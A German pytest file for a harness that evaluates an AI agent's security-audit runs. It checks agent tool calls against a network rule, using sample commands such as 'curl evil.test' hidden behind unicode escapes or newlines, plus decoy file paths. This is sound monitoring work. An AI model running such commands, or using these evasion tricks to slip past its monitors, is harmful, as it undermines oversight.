def test_neue_reviews_nur_differenz(ev, capsys, monkeypatch, tmp_path):
    alt = tmp_path / "home" / ".claude" / "security-reviews" / "alt.md"
    alt.parent.mkdir(parents=True)
    alt.write_text("vorher da")
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web"]) == 0              # vorhandene Datei zählt nicht
    capsys.readouterr()
    monkeypatch.setenv("FAKE_CLAUDE_HOME_DATEIEN", "security-reviews/x/neu.md")
    assert run_eval.main(["--fixture", "fixture-web"]) == 1
    d4 = json.loads(capsys.readouterr().out)["dod"]["TF1-D4"]
    assert d4["ok"] is False and "neu.md" in " ".join(d4["details"]) and "alt.md" not in " ".join(d4["details"])


def test_neue_stats_nur_eval_ordner(ev, capsys, monkeypatch):
    ev.modus("bericht")
    monkeypatch.setenv("FAKE_CLAUDE_HOME_DATEIEN", "agent-stats/fremd/x.md")
    assert run_eval.main(["--fixture", "fixture-web"]) == 0              # fremder Ordner zählt nicht
    capsys.readouterr()
    monkeypatch.setenv("FAKE_CLAUDE_HOME_DATEIEN", "agent-stats/eval-security-audit-zzz/x.md")
    assert run_eval.main(["--fixture", "fixture-web"]) == 1
    d4 = json.loads(capsys.readouterr().out)["dod"]["TF1-D4"]
    assert d4["ok"] is False and "eval-security-audit-zzz" in " ".join(d4["details"])


def test_bericht_kein_dict_in_lauf(ev, capsys, monkeypatch, tmp_path):
    kaputt = tmp_path / "liste.json"
    kaputt.write_text("[]")
    monkeypatch.setenv("FAKE_CLAUDE_BERICHT", str(kaputt))
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web"]) == 1
    d1 = json.loads(capsys.readouterr().out)["dod"]["TF1-D1"]
    assert d1["ok"] is False and "kein Bericht" in d1["details"]


@pytest.mark.parametrize("sig,code", [(signal.SIGTERM, 143), (signal.SIGHUP, 129), (signal.SIGINT, 130)])
def test_signal_beendet_gruppe_und_raeumt_auf(ev, tmp_path, monkeypatch, sig, code):
    """I2: SIGTERM/SIGHUP an run_eval → Kindgruppe beendet, Docker aufgeräumt, Exit 128+Signal."""
    monkeypatch.setenv("FAKE_CLAUDE_MODUS", "haengt")
    monkeypatch.setenv("FAKE_CLAUDE_DOCKER_REST", "1")
    monkeypatch.setenv("TMPDIR", os.path.realpath(tmp_path / "tmp"))
    p = subprocess.Popen([sys.executable, os.path.join(HIER, "run_eval.py"), "--fixture", "fixture-web", "--timeout", "120"],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        for _ in range(300):
            if ev.kind.exists() and ev.kind.read_text() and \
                    "fremder-container" in ev.docker_state.read_text():
                break
            time.sleep(0.1)
        else:
            pytest.fail("Fake-claude kam nicht in den Wartezustand")
        kind = int(ev.kind.read_text())
        p.send_signal(sig)
        p.wait(timeout=60)
    finally:
        if p.poll() is None:
            p.kill()
    assert p.returncode == code
    for _ in range(50):
        if not _lebt(kind):                                            # nur Probe; der Enkel schläft höchstens 60 s
            break
        time.sleep(0.1)
    else:
        pytest.fail("Kindprozess der Gruppe lebt noch")
    assert json.loads(ev.docker_state.read_text()) == {"container": ["fremder-container"], "netze": [], "images": []}
    assert any(c[:3] == ["rm", "-f", "-v"] for c in ev.docker())


@pytest.mark.skipif(os.environ.get("SECURITY_AUDIT_EVAL") != "1", reason="echter Eval-Lauf nur mit SECURITY_AUDIT_EVAL=1")
def test_eval_fixture_web(capsys):
    assert run_eval.main(["--fixture", "fixture-web"]) == 0
    ergebnis = json.loads(capsys.readouterr().out)
    assert set(ergebnis["dod"]) == {f"TF1-D{i}" for i in range(1, 8)}
    assert all(d["ok"] for d in ergebnis["dod"].values()), ergebnis["dod"]


# ------------------------------------------------------------------------------------ Härtung TF1-A5

TEILSTRING_KOEDER = ["src/routes/invoices.js:42-50", "`src/routes/invoices.js`", "src/routes/invoices.js (Zeile 42)",
                     "src/routes/invoices.js, src/routes/x.js", "invoices.js (Zeile 42)", "siehe `invoices.js`",
                     "invoices.js:42-50", "src/routes/invoices.js – Zeilen 42 bis 50", "**src/routes/invoices.js**",
                     "ＳＲＣ/routes/invoices.js:42-50", "Datei: src/routes/invoices.js."]


@pytest.mark.parametrize("pfad", TEILSTRING_KOEDER)
def test_koeder_teilstring_haertung_a5a(bericht, erwartung, pfad):
    """Der Köder-Pfad (oder sein Dateiname als Pfadsegment) irgendwo im Pfadfeld ist ein Köder-Treffer."""
    befund(bericht, "src/routes/invoices.js").update(datei=pfad, stufe="P1", status="bestätigt", poc=f"{POC} anfrage")
    assert any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung)), pfad


@pytest.mark.parametrize("pfad", ["src/routes/myinvoices.js", "src/routes/invoices.json", "src/routes/invoices.jsx",
                                  "src/routes/invoices.js.bak", "src/routes/old-invoices.js", "src/routes/invoices"])
def test_koeder_teilstring_keine_fehlalarme_haertung_a5a(bericht, erwartung, pfad):
    befund(bericht, "src/routes/invoices.js").update(datei=pfad, stufe="P1", status="bestätigt")
    assert not any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung)), pfad


def test_recall_zaehlt_teilstring_nicht_haertung_a5a(bericht, erwartung):
    """Nur Köder sind fail-closed; eine Lücke gilt nur bei normalisiert gleichem Pfad als gefunden."""
    befund(bericht, "src/routes/projects.js")["datei"] = "src/routes/projects.js (Zeile 12)"
    assert any("L1" in f for f in auswertung.pruefe_recall(bericht, erwartung))


def tief(wert, n=60):
    for _ in range(n):
        wert = {"n": wert}
    return wert


def test_zu_tiefer_agent_start_macht_d6_rot_haertung_a5b(bericht, erwartung, stream):
    ereignis = {"type": "user", "message": tief({"type": "tool_use", "id": "x", "name": "Agent", "input": {}})}
    ueberlauf = []
    assert auswertung.zaehle_subagenten([ereignis], ueberlauf) == 0 and ueberlauf == ["user"]
    e = alles(bericht, erwartung, stream + [ereignis])
    d6 = e["dod"]["TF1-D6"]
    assert d6["ok"] is False and any("zu tief" in d for d in d6["details"]), d6
    assert e["ok"] is False
    assert alles(bericht, erwartung, stream)["dod"]["TF1-D6"]["ok"] is True


def test_zaehle_subagenten_ohne_ueberlaufliste_bleibt_kompatibel_haertung_a5b():
    assert auswertung.zaehle_subagenten([tool_use("a", "Agent", {})]) == 1


def abgeschnitten(command, rest=""):
    return ('{"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t9", "name": "Bash", '
            '"input": {"command": "' + command + rest)


def netz_letzte(bericht, zeile):
    return auswertung.pruefe_netz([bash("a", "ls")], bericht, MUSTER, zeile)


@pytest.mark.parametrize("zeile", [
    '{"type": "user", "message": {"content": [{"type": "tool_result", "content": "<a href=\\"http://evil.test/x\\">hi</a> status: 200 http://evil.test/y',
    '{"type": "user", "content": "Antwort der App: http://evil.test/ und curl evil.test steht im Body',
    abgeschnitten("python3 -I /x/security-audit/scripts/poc.py anfrage --lauf 0a1b2c3d --rolle p1 --pfad /x"),
    abgeschnitten("python3 -I /x/security-audit/scripts/poc.py anfrage --pfad /api?u=http%3A%2F%2Flocalhost%3A3000"),
    abgeschnitten("grep -rn curl src/"),
    '{"type": "assistant", "message": {"con',
])
def test_abgeschnittene_zeile_ohne_command_verstoss_ist_ok_haertung_a5c(bericht, zeile):
    """Nur der Wert von "command" geht durch die Netzregel; URLs in übrigem Rohtext (poc-Ausgabe) sind kein Verstoß."""
    assert netz_letzte(bericht, zeile) == []


@pytest.mark.parametrize("zeile", [
    abgeschnitten("curl http://evil.test/x"),
    abgeschnitten("curl evil.test"),
    abgeschnitten("ls\\u003bcurl evil.test"),                    # `;` nur dekodiert sichtbar
    abgeschnitten("ls\\ncurl evil.test"),                          # Zeilenumbruch nur dekodiert
    abgeschnitten("curl evil.test \\u00"),                         # Escape mitten abgeschnitten
    abgeschnitten("ls\\u003bcurl evil.test \\u00"),             # dekodieren nötig UND Escape abgeschnitten
    abgeschnitten("echo \\\"a\\\"; curl evil.test"),
    abgeschnitten("python3 -I /x/security-audit/scripts/poc.py a ; curl http://localhost/"),
    abgeschnitten("echo ok", '"}}, {"type": "tool_use", "name": "Bash", "input": {"command": "wget evil.test'),
])
def test_abgeschnittene_zeile_command_wird_geprueft_haertung_a5c(bericht, zeile):
    fehler = netz_letzte(bericht, zeile)
    assert any("letzte Stream-Zeile" in f for f in fehler), (zeile, fehler)


@pytest.mark.parametrize("zeile", [
    '{"type": "user", "content": "Antwort enthält fixture.invalid',
    '{"type": "user", "content": "Antwort enth%C3%A4lt FIXTURE%2Einvalid',
    abgeschnitten("echo ｆｉｘｔｕｒｅ.invalid"),
    '{"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "WebFetch", "input": {"ur',
])
def test_abgeschnittene_zeile_verbotene_muster_im_rohtext_haertung_a5c(bericht, zeile):
    assert any("letzte Stream-Zeile" in f for f in netz_letzte(bericht, zeile)), zeile


@pytest.mark.parametrize("muster_text", ["ｆｉｘｔｕｒｅ.invalid", "ﬁxture.invalid", "FIXTURE.ｉｎｖａｌｉｄ", "fixture．invalid"])
def test_verbotene_muster_nfkc_haertung_a5d(bericht, muster_text):
    assert auswertung._verbotene(f"echo {muster_text}", MUSTER) == MUSTER
    assert auswertung.pruefe_netz([bash("a", f"echo {muster_text}")], bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": f"http://localhost/?q={muster_text}"})], bericht, MUSTER)
    befund(bericht, "src/routes/projects.js")["poc"] = f"{POC} anfrage --pfad /x?h={muster_text}"
    assert any("S-1" in f for f in auswertung.pruefe_netz([], bericht, MUSTER))


def test_verbotene_muster_nfkc_muster_selbst_haertung_a5d():
    assert auswertung._verbotene("echo fixture.invalid", ["ｆｉｘｔｕｒｅ.invalid"]) == ["ｆｉｘｔｕｒｅ.invalid"]
    assert auswertung._verbotene("echo harmlos", ["ｆｉｘｔｕｒｅ.invalid"]) == []


def test_signal_direkt_nach_dem_start_beendet_kind_trotzdem_haertung_a7(ev, monkeypatch, capsys):
    """Das Signal kommt, nachdem das Kind existiert, aber bevor `_lauf` sein Popen-Objekt kennt: der Handler setzt nur ein
    Flag; `_lauf` prüft es direkt nach der Zuweisung von `p` und beendet die eigene Prozessgruppe."""
    ev.modus("haengt")
    echtes, gestartet = run_eval._kind_starten, []

    def bombe(cmd, cwd, env, stdout, stderr):
        p = echtes(cmd, cwd, env, stdout, stderr)
        if "json" in cmd:                                  # Smoke-Test normal durchlassen
            return p
        gestartet.append(p)
        for _ in range(100):                               # Enkel soll existieren, bevor das Signal kommt
            if ev.kind.exists() and ev.kind.read_text():
                break
            time.sleep(0.1)
        signal.raise_signal(signal.SIGTERM)                # echtes Signal nach Popen, vor der Zuweisung
        return p

    monkeypatch.setattr(run_eval, "_kind_starten", bombe)
    assert run_eval.main(["--fixture", "fixture-web", "--timeout", "120"]) == 143
    (p,) = gestartet
    try:
        p.wait(timeout=15)                                 # Fake-claude beendet, nicht mehr in `time.sleep(60)`
    except subprocess.TimeoutExpired:
        p.kill()
        pytest.fail("Kindprozess nach Signal nicht beendet")
    assert ev.kind.read_text(), "Enkelprozess wurde nie gestartet (Test sinnlos)"
    for _ in range(50):
        if not _lebt(int(ev.kind.read_text())):
            break
        time.sleep(0.1)
    else:
        pytest.fail("Enkelprozess der Gruppe lebt noch")


@pytest.fixture
def abbruch_handler():
    """SIGTERM-Handler wie in `main` (setzt nur das Flag), nur im Hauptthread; danach der alte. Flag zurückgesetzt."""
    alt = signal.signal(signal.SIGTERM, run_eval._signal_handler)
    run_eval._abbruch_signal = None
    yield
    run_eval._abbruch_signal = None
    signal.signal(signal.SIGTERM, alt)


def _kind_mit_signal(monkeypatch, gestartet):
    """Ersetzt `_kind_starten`: startet ein eigenes `sleep`-Kind in eigener Sitzung und ruft danach den Signalhandler
    auf (wie ein Signal, das nach dem echten Start eintrifft, bevor `_lauf` das Popen-Objekt zugewiesen hat)."""
    def bombe(cmd, cwd, env, stdout, stderr):
        p = subprocess.Popen(["sleep", "30"], stdin=subprocess.DEVNULL, stdout=stdout, stderr=stderr,
                             start_new_session=True)
        gestartet.append(p)
        run_eval._signal_handler(signal.SIGTERM, None)
        return p

    monkeypatch.setattr(run_eval, "_kind_starten", bombe)


def _eigenes_kind_per_sigterm_beendet(gestartet):
    (p,) = gestartet
    try:
        p.wait(timeout=3)
    except subprocess.TimeoutExpired:
        p.kill()                                           # eigenes Popen-Objekt
        p.wait()
        pytest.fail("eigenes Kind nach Signal im Start nicht innerhalb von 3 s beendet")
    assert p.returncode == -signal.SIGTERM, "Kind muss per SIGTERM enden (nicht per SIGKILL nach Wartezeit)"


def test_signal_handler_setzt_nur_das_flag_und_wirft_nichts(abbruch_handler):
    assert run_eval._abbruch_signal is None
    assert run_eval._signal_handler(signal.SIGHUP, None) is None
    assert run_eval._abbruch_signal == signal.SIGHUP
    with pytest.raises(run_eval.Abbruch) as e:
        run_eval._abbruch_pruefen()
    assert e.value.signum == signal.SIGHUP


def test_signal_im_start_beendet_eigenes_kind_lauf(tmp_path, monkeypatch, abbruch_handler):
    gestartet: list = []
    _kind_mit_signal(monkeypatch, gestartet)
    t0 = time.monotonic()
    with pytest.raises(run_eval.Abbruch):
        run_eval._lauf(["claude"], str(tmp_path), {}, str(tmp_path / "s"), str(tmp_path / "e"), 60)
    assert time.monotonic() - t0 < 3
    _eigenes_kind_per_sigterm_beendet(gestartet)


def test_signal_im_start_beendet_eigenes_kind_smoke_test(tmp_path, monkeypatch, abbruch_handler):
    gestartet: list = []
    _kind_mit_signal(monkeypatch, gestartet)
    t0 = time.monotonic()
    with pytest.raises(run_eval.Abbruch):
        run_eval._smoke_test([], str(tmp_path), {})
    assert time.monotonic() - t0 < 3
    _eigenes_kind_per_sigterm_beendet(gestartet)


def _kind_sleep_und_spaeteres_signal(monkeypatch, gestartet, verzoegerung):
    """Startet ein eigenes `sleep`-Kind; der Handler wird erst nach `verzoegerung` s aufgerufen (Signal in der Warteschleife)."""
    import threading

    def starten(cmd, cwd, env, stdout, stderr):
        p = subprocess.Popen(["sleep", "30"], stdin=subprocess.DEVNULL, stdout=stdout, stderr=stderr,
                             start_new_session=True)
        gestartet.append(p)
        t = threading.Timer(verzoegerung, run_eval._signal_handler, args=(signal.SIGHUP, None))
        t.daemon = True
        t.start()
        return p

    monkeypatch.setattr(run_eval, "_kind_starten", starten)


def test_signal_in_der_warteschleife_beendet_kind_lauf(tmp_path, monkeypatch, abbruch_handler):
    gestartet: list = []
    _kind_sleep_und_spaeteres_signal(monkeypatch, gestartet, 0.3)
    t0 = time.monotonic()
    with pytest.raises(run_eval.Abbruch) as e:
        run_eval._lauf(["claude"], str(tmp_path), {}, str(tmp_path / "s"), str(tmp_path / "e"), 60)
    assert e.value.signum == signal.SIGHUP and time.monotonic() - t0 < 3
    _eigenes_kind_per_sigterm_beendet(gestartet)


def test_signal_in_der_warteschleife_beendet_kind_smoke_test(tmp_path, monkeypatch, abbruch_handler):
    gestartet: list = []
    _kind_sleep_und_spaeteres_signal(monkeypatch, gestartet, 0.3)
    t0 = time.monotonic()
    with pytest.raises(run_eval.Abbruch) as e:
        run_eval._smoke_test([], str(tmp_path), {})
    assert e.value.signum == signal.SIGHUP and time.monotonic() - t0 < 3
    _eigenes_kind_per_sigterm_beendet(gestartet)


def test_signal_vor_dem_start_startet_kein_kind(tmp_path, monkeypatch, abbruch_handler):
    def nie(*a, **kw):
        raise AssertionError("Kind gestartet trotz anstehendem Abbruch")

    monkeypatch.setattr(run_eval, "_kind_starten", nie)
    run_eval._signal_handler(signal.SIGTERM, None)
    with pytest.raises(run_eval.Abbruch):
        run_eval._lauf(["claude"], str(tmp_path), {}, str(tmp_path / "s"), str(tmp_path / "e"), 60)
    with pytest.raises(run_eval.Abbruch):
        run_eval._smoke_test([], str(tmp_path), {})


MASKE_AUSGEBEN = ("import json, signal; "
                  "print(json.dumps(sorted(int(s) for s in signal.pthread_sigmask(signal.SIG_BLOCK, []))))")


def test_kind_erbt_keine_signalmaske_haertung_i1(tmp_path, monkeypatch, abbruch_handler):
    """Das Kind (python3, gibt seine Signalmaske aus) hat SIGTERM/SIGHUP/SIGINT nicht gesperrt; der Elternprozess sperrt
    beim Start auch nichts."""
    echtes, eltern_masken = run_eval._kind_starten, []

    def beobachten(*a, **kw):
        eltern_masken.append(signal.pthread_sigmask(signal.SIG_BLOCK, []))
        return echtes(*a, **kw)

    monkeypatch.setattr(run_eval, "_kind_starten", beobachten)
    stream = tmp_path / "stream"
    lauf = run_eval._lauf([sys.executable, "-c", MASKE_AUSGEBEN], str(tmp_path), dict(os.environ), str(stream),
                          str(tmp_path / "err"), 30)
    assert lauf["rc"] == 0
    maske = json.loads(stream.read_text())
    for sig in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT):
        assert int(sig) not in maske, (sig, maske)
        assert sig not in eltern_masken[0]
    p = run_eval._kind_starten([sys.executable, "-c", MASKE_AUSGEBEN], str(tmp_path), dict(os.environ),
                               subprocess.PIPE, subprocess.PIPE)
    out, _ = p.communicate(timeout=30)
    assert int(signal.SIGTERM) not in json.loads(out)


def test_main_setzt_handler_fuer_term_hup_int_und_setzt_flag_zurueck_haertung_i1(monkeypatch):
    gesehen = {}

    def fake_main(argv):
        gesehen["flag"] = run_eval._abbruch_signal
        for sig in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT):
            gesehen[sig] = signal.getsignal(sig) is run_eval._signal_handler
        return 0

    alt = {sig: signal.getsignal(sig) for sig in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT)}
    run_eval._abbruch_signal = signal.SIGTERM                 # Rest eines früheren Laufs
    monkeypatch.setattr(run_eval, "_main", fake_main)
    try:
        assert run_eval.main([]) == 0
    finally:
        run_eval._abbruch_signal = None
    assert gesehen["flag"] is None
    assert all(gesehen[s] for s in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT))
    assert {sig: signal.getsignal(sig) for sig in alt} == alt  # Handler nach `main` wiederhergestellt


@pytest.mark.parametrize("sig,code", [(signal.SIGTERM, 143), (signal.SIGHUP, 129), (signal.SIGINT, 130)])
def test_main_gibt_128_plus_signal_zurueck_haertung_i1(monkeypatch, sig, code):
    def fake_main(argv):
        raise run_eval.Abbruch(sig)

    monkeypatch.setattr(run_eval, "_main", fake_main)
    assert run_eval.main([]) == code


def test_start_fehler_im_lauf_bleibt_der_urspruengliche_fehler_haertung_a7(tmp_path, monkeypatch):
    """Scheitert der Start selbst, kommt der Originalfehler an (kein UnboundLocalError/AttributeError aus dem Aufräumen)."""
    def kaputt(*a, **kw):
        raise FileNotFoundError("claude")

    monkeypatch.setattr(run_eval, "_kind_starten", kaputt)
    with pytest.raises(FileNotFoundError):
        run_eval._lauf(["claude"], str(tmp_path), {}, str(tmp_path / "s"), str(tmp_path / "e"), 5)
    ok, grund = run_eval._smoke_test([], str(tmp_path), {})
    assert ok is False and "nicht startbar" in grund


# ------------------------------------------------------------------------------------ Härtung TF1-B5 / B6 (Eval)

def test_docker_aufraeumen_meldet_nicht_lesbare_listen_haertung_b5(ev, capsys):
    """Nicht lesbares Docker ist nicht „nichts übrig“: Rückgabe False und eine Meldung."""
    ev.docker_state.write_text(json.dumps({"kaputt": True, "container": [], "netze": [], "images": []}))
    assert run_eval.docker_aufraeumen({"0a1b2c3d"}) is False
    assert "nicht lesbar" in capsys.readouterr().err


def test_docker_aufraeumen_sauber_bleibt_true_haertung_b5(ev):
    assert run_eval.docker_aufraeumen({"0a1b2c3d"}) is True


def test_opus_md_lesen_nennt_die_quelle_haertung_b5(tmp_path, monkeypatch, capsys):
    text = run_eval._opus_md_lesen()                              # echtes Repo: agents/opus-xhigh.md
    assert "opus-xhigh" in text or "description" in text
    assert os.path.join("agents", "opus-xhigh.md") in capsys.readouterr().err
    leer = tmp_path / "skill-ohne-agents" / "security-audit"
    leer.mkdir(parents=True)
    home = tmp_path / "home"
    (home / ".claude" / "agents").mkdir(parents=True)
    (home / ".claude" / "agents" / "opus-xhigh.md").write_text("---\ndescription: x\n---\nrumpf\n", encoding="utf-8")
    monkeypatch.setattr(run_eval, "SKILL_DIR", str(leer))
    monkeypatch.setenv("HOME", str(home))
    assert "rumpf" in run_eval._opus_md_lesen()
    fehler = capsys.readouterr().err
    assert str(home) in fehler and "Ersatz" in fehler            # Fallback auf die Home-Datei ist sichtbar


def test_bericht_lesen_nimmt_den_bericht_nicht_eine_anfragedatei_haertung_b6(tmp_path):
    """Prüfer legen Request-Bodys als .json im Ausgabeordner ab; der neueste .json ist nicht automatisch der Bericht."""
    ordner = tmp_path / "ausgabe" / "repo"
    ordner.mkdir(parents=True)
    bericht_pfad = ordner / "2026-11-09-abc1234.json"
    bericht_pfad.write_text(json.dumps({"version": 1, "befunde": []}), encoding="utf-8")
    anfrage = ordner / "daten-p1-1.json"
    anfrage.write_text(json.dumps({"titel": "x"}), encoding="utf-8")
    os.utime(bericht_pfad, (1000, 1000))
    os.utime(anfrage, (2000, 2000))                               # neuer als der Bericht
    daten, pfad = run_eval._bericht_lesen(str(ordner))
    assert pfad == str(bericht_pfad) and daten == {"version": 1, "befunde": []}


def test_bericht_lesen_ohne_bericht_unter_den_json_haertung_b6(tmp_path):
    (tmp_path / "daten-p1-1.json").write_text("{}", encoding="utf-8")
    daten, _pfad = run_eval._bericht_lesen(str(tmp_path))
    assert daten is None


def test_eval_laeuft_nicht_parallel_haertung_b6(ev, capsys):
    """Zwei Eval-Läufe räumen sonst gegenseitig alles mit Präfix security-audit- ab."""
    import fcntl
    fd = os.open(os.path.join(os.path.realpath(tempfile.gettempdir()), "security-audit-eval.lock"),
                 os.O_RDWR | os.O_CREAT, 0o600)
    fcntl.flock(fd, fcntl.LOCK_EX)
    try:
        assert run_eval.main(["--fixture", "fixture-web", "--timeout", "5"]) == 7
    finally:
        os.close(fd)
    assert "anderer Eval-Lauf" in capsys.readouterr().err
    assert ev.docker() == [] and ev.aufrufe() == []               # nichts angefasst
    ev.modus("bericht")
    assert run_eval.main(["--fixture", "fixture-web"]) == 0       # Sperre frei: läuft (und gibt sie wieder frei)
    assert run_eval.main(["--fixture", "fixture-web"]) == 0


# ------------------------------------------------------------------------------------ Smoke-Test: Ausgabeformat der CLI

@pytest.mark.parametrize("text, ok", [
    ('{"type": "result", "is_error": false, "result": "ok"}', True),
    ('{"type": "result", "is_error": true, "result": "401"}', False),
    ('[{"type": "system"}, {"type": "assistant"}, {"type": "result", "is_error": false, "result": "ok"}]', True),
    ('[{"type": "system"}, {"type": "result", "is_error": true, "result": "401"}]', False),
    ('[{"type": "system"}, {"type": "assistant"}]', False),
    ('[]', False),
    ('"ok"', False),
    ('kein json', False),
])
def test_smoke_antwort_objekt_und_liste(text, ok):
    """CLI 2.1.x liefert `--output-format json` als Nachrichtenliste; das letzte `result`-Objekt entscheidet."""
    assert run_eval._smoke_antwort(text)[0] is ok
